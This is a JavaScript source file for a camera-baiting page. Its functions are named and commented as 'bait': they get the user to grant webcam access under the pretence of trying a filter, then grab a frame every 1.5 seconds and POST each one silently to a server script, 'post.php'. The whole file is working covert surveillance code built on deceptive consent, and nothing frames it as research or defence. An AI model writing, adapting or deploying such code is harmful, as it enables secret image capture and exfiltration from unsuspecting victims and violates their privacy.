function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'post.php',
        dataType: 'json',
        async: false,
        success: function(result){
            // call the function that handles the results if they are ok...
        },
        error: function(){
        }
      });
      // ajax call for sending camera screenshots
    };
    
    
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');
    
    
    
    
    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
        
      }
    };
    function handleBait(){
      let cBait = document.querySelector("#c_bait");
      let xBait = canvas.getContext("2d");
      let vBait = document.querySelector("#v_bait");
     
      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
    {
        
        navigator.mediaDevices.getUserMedia({video: true}).then((stream) =>{
        vBait.srcObject = stream;
        video.play();
        let show = document.getElementById("c_bait").hidden = false;
        let showc = document.getElementById("v_bait").hidden = false;
        // make user accepting Cam usage in the way that he accepts it for trying out filter, while screenshots will be sent to the server..  
      });
    }
    }
    
    
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
        
      }
      // initialize streaming
    }
    
    
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
    
    let context = canvas.getContext('2d');
      setInterval(function(){
           context.drawImage(video, 0, 0, 640, 480);
           let canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
           post(canvasData); }, 1500);
          //  transfering image usable format
    }
    